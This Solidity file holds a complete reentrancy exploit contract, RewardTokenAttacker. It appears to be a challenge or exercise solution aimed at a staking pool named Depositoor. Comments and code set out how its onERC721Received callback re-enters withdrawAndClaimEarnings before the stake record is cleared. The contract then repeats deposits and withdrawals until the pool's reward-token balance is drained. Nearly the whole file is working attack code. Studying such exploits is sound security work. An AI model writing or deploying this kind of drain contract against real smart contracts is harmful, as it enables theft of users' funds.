// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {RewardToken, Depositoor, NftToStake} from "./RewardToken.sol";

contract RewardTokenAttacker is IERC721Receiver {
    // Plan:
    // withdrawAndClaimEarnings reenters before deleting the stake state
    // at that point, we've got our NFT back + the payout, but the stake state is still there
    // we could deposit the NFT again and withdraw again to once more get it back + payout
    // keep depositing and withdrawing until we've drained the contract's ERC20 balance

    Depositoor public pool;
    RewardToken public token;
    NftToStake public nft;
    uint256 public tokenId;

    function initialize(Depositoor _pool, RewardToken _token, NftToStake _nft, uint256 _tokenId) external {
        pool = _pool;
        token = _token;
        nft = _nft;
        tokenId = _tokenId;
    }

    function prepare() external {
        // Transfer to pool, set stake state
        nft.safeTransferFrom(address(this), address(pool), tokenId);
    }

    function attack() external {
        // Trigger reentrancy
        pool.withdrawAndClaimEarnings(tokenId);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes calldata) external override returns (bytes4) {
        if (token.balanceOf(address(pool)) > 0) {
            // We don't want to trigger onERC721Received
            nft.transferFrom(address(this), address(pool), _tokenId);
            pool.withdrawAndClaimEarnings(_tokenId);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
